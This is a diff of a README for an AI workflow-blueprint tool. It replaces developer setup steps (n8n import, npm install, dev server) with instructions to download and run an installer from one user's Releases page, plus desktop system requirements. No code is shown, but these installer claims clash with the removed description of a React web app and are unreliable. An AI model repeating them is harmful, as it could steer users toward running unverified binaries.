@@ -1,85 +1,69 @@
-# 🤖 Automation Consultant
+# 🤖 ai-automation-consultant - Streamline Your Workflows with AI
 
-> **Transform manual workflows into intelligent automation blueprints—powered by AI.**
+[![Download the latest version](https://img.shields.io/badge/Download-Latest%20Version-blue.svg)](https://github.com/Victor7092/ai-automation-consultant/releases)
 
-Automation Consultant is an AI-powered React dashboard that helps businesses architect automation workflows. Simply describe your manual process, and our AI Agent delivers a complete technical blueprint including a visual node graph, recommended tech stack, and step-by-step logic.
+## 🛠️ Introduction
 
----
+Welcome to the Automation Consultant project. This application transforms manual workflows into intelligent automation blueprints using AI. Describe your current processes, and our AI Agent will create a complete technical blueprint tailored to your needs. 
 
 ## ✨ Features
 
-- **📝 Interactive Intake Form** – Capture industry, role, manual tasks, tools, triggers, and goals in a clean, intuitive interface.
-- **🧠 AI Architect Agent** – Powered by Google Gemini via n8n, the AI analyzes your input and generates a custom automation blueprint.
-- **🔗 Visual Node Graph** – See your workflow as a step-by-step visual diagram with tools, actions, and descriptions.
-- **🛠️ Smart Tech Stack** – Get tailored SaaS tool recommendations with connection types (native, API, webhook).
-- **📋 One-Click Copy** – Export the entire blueprint to your clipboard for easy sharing or documentation.
+- **📝 Interactive Intake Form**: Use an intuitive interface to capture important details such as industry, role, manual tasks, tools, triggers, and goals.
+- **🧠 AI Architect Agent**: Powered by Google Gemini via n8n, our AI analyzes your input and generates a custom automation blueprint.
+- **🔗 Visual Node Graph**: Visualize your workflow with a step-by-step diagram, showing tools, actions, and descriptions.
+- **🛠️ Smart Tech Stack**: Receive tailored recommendations for software tools, including connection types like native, API, or webhook.
+- **📋 One-Click Copy**: Export your entire blueprint easily to share or for documentation purposes.
 
----
+## 🚀 Getting Started
 
-## 📋 Prerequisites
+Follow these steps to get started with Automation Consultant.
 
-Before you begin, ensure you have the following:
+1. **Download the Application**: Visit our Releases page to download the latest version of the software.
+   - [Download from Releases](https://github.com/Victor7092/ai-automation-consultant/releases)
 
-- **Node.js v18+** – [Download here](https://nodejs.org/)
-- **n8n Instance** – Self-hosted or cloud instance with Google Gemini integration
+2. **Install the Application**:
+   - Locate the downloaded file on your computer.
+   - Run the installer and follow the prompts to complete the installation.
 
----
+3. **Open the Application**: Once installed, launch the Automation Consultant from your applications list.
 
-## 🚀 Setup Guide
+4. **Use the Interactive Intake Form**: Begin by filling out the intake form. Provide details about your industry, role, and the tasks you wish to automate.
 
-### **Backend (n8n)**
+5. **Generate Your Blueprint**: After submitting the intake form, the AI Architect Agent will analyze your inputs. It will create a visual node graph and a detailed blueprint tailored to your specified needs.
 
-1. **Import the Workflow**
-   - Open your n8n instance
-   - Navigate to **Workflows** → **Import from File**
-   - Select `workflow.json` from this repository
+## 📥 Download & Install
 
-2. **Configure Google Gemini Credentials**
-   - In the imported workflow, locate the **Google Gemini** node
-   - Click **Credentials** → **Create New**
-   - Enter your **Gemini API Key** ([Get one here](https://aistudio.google.com/app/apikey))
-   - Save the credentials
+To get the application, simply visit our Releases page. Click on the latest version to download and follow the provided instructions to install.
 
-3. **Activate the Workflow**
-   - Click the **Active** toggle in the top-right corner
-   - Ensure the workflow status shows as **Active**
+- [Download from Releases](https://github.com/Victor7092/ai-automation-consultant/releases)
 
-4. **Copy the Production Webhook URL**
-   - Click on the **Webhook** node (first node in the workflow)
-   - Copy the **Production URL** (e.g., `https://your-n8n-instance.com/webhook/consultant`)
-   - You'll need this for the frontend setup
+### 💻 System Requirements
 
----
+- **Operating System**: Windows 10 or later, MacOS 10.14 or later, or Linux (Ubuntu or Fedora).
+- **RAM**: Minimum 4 GB, recommended 8 GB.
+- **Disk Space**: At least 500 MB available.
+- **Internet Connection**: Required for using the AI features and fetching tool data.
 
-### **Frontend (React)**
+## 🤔 Frequently Asked Questions
 
-1. **Clone the Repository**
-   ```bash
-   git clone https://github.com/yourusername/ai-automation-consultant.git
-   cd ai-automation-consultant
-   ```
+### 1. What does the application do?
 
-2. **Install Dependencies**
-   ```bash
-   npm install
-   ```
+The Automation Consultant helps you create automation blueprints from your manual workflows. You fill out a form detailing your processes, and the AI provides a full technical blueprint.
 
-3. **Update API Endpoint**
-   - Open `src/App.tsx`
-   - Locate line 32:
-     ```typescript
-     const API_ENDPOINT = 'N8N_LINK';
-     ```
-   - Replace with your **Production Webhook URL** from Step 4 above
+### 2. Is the software free to use?
 
-4. **Run the Development Server**
-   ```bash
-   npm run dev
-   ```
-   - Open [http://localhost:5173](http://localhost:5173) in your browser
+Yes, Automation Consultant is free to download and use.
 
----
+### 3. Can I share my blueprints?
 
-<div align="center">
-  <strong>Built with ❤️ by automation enthusiasts</strong>
-</div>
+Absolutely! You can easily export your blueprints to share with your team or keep for documentation.
+
+## 📞 Support
+
+If you encounter any issues or have questions, please reach out through our [GitHub Issues](https://github.com/Victor7092/ai-automation-consultant/issues). We will respond as quickly as possible.
+
+## 🗨️ Community Feedback
+
+We value user feedback. If you have suggestions for features or improvements, please let us know. Your input helps us make the Automation Consultant even better.
+
+Thank you for using Automation Consultant. We look forward to helping you automate your workflows!
